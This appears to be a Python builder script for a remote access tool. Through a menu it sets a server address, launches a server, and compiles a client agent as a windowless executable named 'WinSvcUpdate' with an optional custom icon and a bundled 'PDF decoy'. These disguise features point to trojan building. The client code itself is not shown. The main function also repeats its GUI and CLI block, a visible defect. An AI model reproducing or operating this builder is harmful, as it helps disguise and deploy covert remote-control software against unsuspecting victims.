#!/usr/bin/env python3
"""
All-in-One Remote Management Tool
Supports both GUI and CLI interfaces based on system capabilities
"""

import os
import sys
import platform
import subprocess
import threading
import time
import socket
import shutil
import argparse
import json
from pathlib import Path

def detect_gui_support():
    """Detect if GUI is available on the system"""
    system = platform.system().lower()

    if system == "windows":
        # Windows - check if we can import tkinter and have display
        try:
            import tkinter
            root = tkinter.Tk()
            root.withdraw()
            root.destroy()
            return True
        except:
            return False

    elif system == "linux":
        # Linux - check for DISPLAY environment variable and tkinter
        display = os.environ.get('DISPLAY')
        if not display:
            return False
        try:
            import tkinter
            root = tkinter.Tk()
            root.withdraw()
            root.destroy()
            return True
        except:
            return False

    elif system == "darwin":  # macOS
        try:
            import tkinter
            root = tkinter.Tk()
            root.withdraw()
            root.destroy()
            return True
        except:
            return False

    return False

def get_local_ips():
    """Get list of local IP addresses"""
    ips = ["0.0.0.0", "127.0.0.1"]
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except:
        pass
    return ips

class CLIManager:
    """Command Line Interface Manager"""

    def __init__(self):
        self.config = {
            'server_ip': '127.0.0.1',
            'server_port': '8080',
            'icon_path': '',
            'pdf_path': '',
            'use_pdf': False
        }
        self.load_config()

    def load_config(self):
        """Load configuration from file if exists"""
        config_file = Path('manager_config.json')
        if config_file.exists():
            try:
                with open(config_file, 'r') as f:
                    self.config.update(json.load(f))
            except:
                pass

    def save_config(self):
        """Save configuration to file"""
        try:
            with open('manager_config.json', 'w') as f:
                json.dump(self.config, f, indent=2)
        except:
            pass

    def print_banner(self):
        """Print CLI banner"""
        print("=" * 60)
        print("  REMOTE MANAGEMENT TOOL - CLI MODE")
        print("  All-in-One Configuration & Build System")
        print("=" * 60)

    def print_menu(self):
        """Print main menu"""
        print("\nAvailable Commands:")
        print("1. Configure Server Connection")
        print("2. Start Server")
        print("3. Stop Server")
        print("4. Build Standalone Agent")
        print("5. Show Current Configuration")
        print("6. Exit")
        print()

    def get_user_choice(self):
        """Get user menu choice"""
        while True:
            try:
                choice = input("Enter your choice (1-6): ").strip()
                if choice in ['1', '2', '3', '4', '5', '6']:
                    return choice
                print("Invalid choice. Please enter 1-6.")
            except KeyboardInterrupt:
                print("\nExiting...")
                sys.exit(0)

    def configure_connection(self):
        """Configure server connection settings"""
        print("\n--- Server Connection Configuration ---")

        # Get available IPs
        ips = get_local_ips()
        print(f"Available local IPs: {', '.join(ips)}")

        # Server IP
        current_ip = self.config.get('server_ip', '127.0.0.1')
        ip = input(f"Server IP [{current_ip}]: ").strip()
        if ip:
            self.config['server_ip'] = ip
        else:
            self.config['server_ip'] = current_ip

        # Server Port
        current_port = str(self.config.get('server_port', '8080'))
        port = input(f"Server Port [{current_port}]: ").strip()
        if port:
            try:
                int(port)  # Validate port
                self.config['server_port'] = port
            except ValueError:
                print("Invalid port number. Using default.")
                self.config['server_port'] = current_port

        # Icon path
        current_icon = self.config.get('icon_path', '')
        icon = input(f"Icon path (leave empty for none) [{current_icon}]: ").strip()
        if icon:
            if os.path.exists(icon):
                self.config['icon_path'] = icon
            else:
                print("Icon file not found. Keeping current setting.")

        # PDF decoy
        use_pdf = input(f"Use PDF decoy wrapper? (y/n) [{'y' if self.config.get('use_pdf', False) else 'n'}]: ").strip().lower()
        if use_pdf in ['y', 'yes']:
            self.config['use_pdf'] = True
            current_pdf = self.config.get('pdf_path', '')
            pdf = input(f"PDF path [{current_pdf}]: ").strip()
            if pdf:
                if os.path.exists(pdf):
                    self.config['pdf_path'] = pdf
                else:
                    print("PDF file not found.")
        else:
            self.config['use_pdf'] = False

        self.save_config()
        print("Configuration saved!")

    def show_configuration(self):
        """Show current configuration"""
        print("\n--- Current Configuration ---")
        print(f"Server IP: {self.config.get('server_ip', '127.0.0.1')}")
        print(f"Server Port: {self.config.get('server_port', '8080')}")
        print(f"Icon Path: {self.config.get('icon_path', 'None')}")
        print(f"PDF Decoy: {'Enabled' if self.config.get('use_pdf', False) else 'Disabled'}")
        if self.config.get('use_pdf'):
            print(f"PDF Path: {self.config.get('pdf_path', 'None')}")

    def start_server(self):
        """Start the server"""
        print("\n--- Starting Server ---")
        try:
            ip = self.config.get('server_ip', '127.0.0.1')
            port = self.config.get('server_port', '8080')

            # Kill any existing process on the port
            self.kill_port(port)

            # Set environment variables
            env = os.environ.copy()
            env["HOST"] = ip
            env["PORT"] = port

            print(f"Starting server on {ip}:{port}...")
            self.server_process = subprocess.Popen(
                [sys.executable, "server.py"],
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Wait a moment and check if it's running
            time.sleep(2)
            if self.server_process.poll() is None:
                print("✅ Server started successfully!")
                print(f"Dashboard: http://{ip}:{port}")
            else:
                stdout, stderr = self.server_process.communicate()
                print("❌ Failed to start server:")
                print(stderr)

        except Exception as e:
            print(f"❌ Error starting server: {e}")

    def stop_server(self):
        """Stop the server"""
        print("\n--- Stopping Server ---")
        try:
            port = self.config.get('server_port', '8080')
            self.kill_port(port)
            print("✅ Server stopped!")
        except Exception as e:
            print(f"❌ Error stopping server: {e}")

    def kill_port(self, port):
        """Kill process on specified port"""
        try:
            if platform.system() == "Windows":
                # Windows
                out = subprocess.check_output(
                    f'netstat -ano | findstr :{port} | findstr LISTEN',
                    shell=True, text=True
                )
                for line in out.strip().split('\n'):
                    parts = line.split()
                    if parts and parts[-1].isdigit():
                        subprocess.run(
                            ["taskkill", "/F", "/PID", parts[-1], "/T"],
                            capture_output=True
                        )
                        print(f"Killed process PID {parts[-1]} on port {port}")
            else:
                # Linux/macOS
                try:
                    out = subprocess.check_output(
                        ["lsof", "-ti", f":{port}"],
                        text=True
                    )
                    for pid in out.strip().split('\n'):
                        if pid:
                            subprocess.run(["kill", "-9", pid])
                            print(f"Killed process PID {pid} on port {port}")
                except:
                    pass
        except:
            pass

    def build_agent(self):
        """Build standalone agent"""
        print("\n--- Building Standalone Agent ---")

        try:
            ip = self.config.get('server_ip', '127.0.0.1')
            port = self.config.get('server_port', '8080')

            # Phase 1: Inject configuration
            print("Phase 1: Injecting configuration...")
            with open("client.py", "r", encoding="utf-8") as f:
                code = f.read()

            code = code.replace(
                'SERVER_IP = os.environ.get("SERVER_IP", "127.0.0.1")',
                f'SERVER_IP = "{ip}"'
            )
            code = code.replace(
                'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "8080")))',
                f'SERVER_PORT = {port}'
            )

            build_file = "client_build.py"
            with open(build_file, "w", encoding="utf-8") as f:
                f.write(code)

            # Phase 2: Build with PyInstaller
            print("Phase 2: Compiling standalone executable...")
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--noconfirm",
                "--clean",
                "--name", "WinSvcUpdate",
                build_file
            ]

            # Add icon if specified
            icon = self.config.get('icon_path', '')
            if icon and os.path.exists(icon):
                cmd.extend(["--icon", icon])
                print(f"   Using custom icon: {os.path.basename(icon)}")

            # Add PDF if specified
            if self.config.get('use_pdf', False):
                pdf = self.config.get('pdf_path', '')
                if pdf and os.path.exists(pdf):
                    if platform.system() == "Windows":
                        cmd.extend(["--add-data", f"{pdf};."])
                    else:
                        cmd.extend(["--add-data", f"{pdf}:."])
                    print(f"   Bundling PDF decoy: {os.path.basename(pdf)}")

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            # Cleanup
            try:
                os.remove(build_file)
            except:
                pass

            if result.returncode == 0:
                exe_name = "WinSvcUpdate.exe" if platform.system() == "Windows" else "WinSvcUpdate"
                exe_path = os.path.join("dist", exe_name)

                if os.path.exists(exe_path):
                    size_mb = os.path.getsize(exe_path) / 1024 / 1024
                    print("✅ Build completed successfully!")
                    print(f"   Output: {exe_path}")
                    print(f"   Size: {size_mb:.1f} MB")
                else:
                    print("❌ Build completed but output file not found")
            else:
                print("❌ Build failed:")
                print(result.stderr[-1000:])  # Last 1000 chars of error

        except Exception as e:
            print(f"❌ Error during build: {e}")

    def run(self):
        """Main CLI loop"""
        self.print_banner()

        # Check if running interactively
        import sys
        if not sys.stdin.isatty():
            print("Non-interactive terminal detected.")
            print("Use --help for command line options or run interactively.")
            return

        while True:
            self.print_menu()
            choice = self.get_user_choice()

            if choice == '1':
                self.configure_connection()
            elif choice == '2':
                self.start_server()
            elif choice == '3':
                self.stop_server()
            elif choice == '4':
                self.build_agent()
            elif choice == '5':
                self.show_configuration()
            elif choice == '6':
                print("Exiting...")
                break

            input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Remote Management Tool')
    parser.add_argument('--cli', action='store_true', help='Force CLI mode')
    parser.add_argument('--gui', action='store_true', help='Force GUI mode')

    args = parser.parse_args()

    # Determine interface mode
    use_gui = detect_gui_support()

    if args.cli:
        use_gui = False
    elif args.gui:
        use_gui = True

    if use_gui:
        print("GUI detected, launching graphical interface...")
        try:
            # Import and run the GUI version
            import vnc_all_in_one
            # The GUI will handle its own main loop
        except ImportError as e:
            print(f"GUI mode failed: {e}")
            print("Falling back to CLI mode...")
            use_gui = False
        except Exception as e:
            print(f"GUI mode error: {e}")
            print("Falling back to CLI mode...")
            use_gui = False

    if not use_gui:
        print("Using command-line interface...")
        cli_manager = CLIManager()
        cli_manager.run()
        print("GUI detected, launching graphical interface...")
        try:
            # Import and run the GUI version
            import vnc_all_in_one
            # The GUI will handle its own main loop
        except ImportError as e:
            print(f"GUI mode failed: {e}")
            print("Falling back to CLI mode...")
            use_gui = False
        except Exception as e:
            print(f"GUI mode error: {e}")
            print("Falling back to CLI mode...")
            use_gui = False

    if not use_gui:
        print("Using command-line interface...")
        cli_manager = CLIManager()
        cli_manager.run()

if __name__ == "__main__":
    main()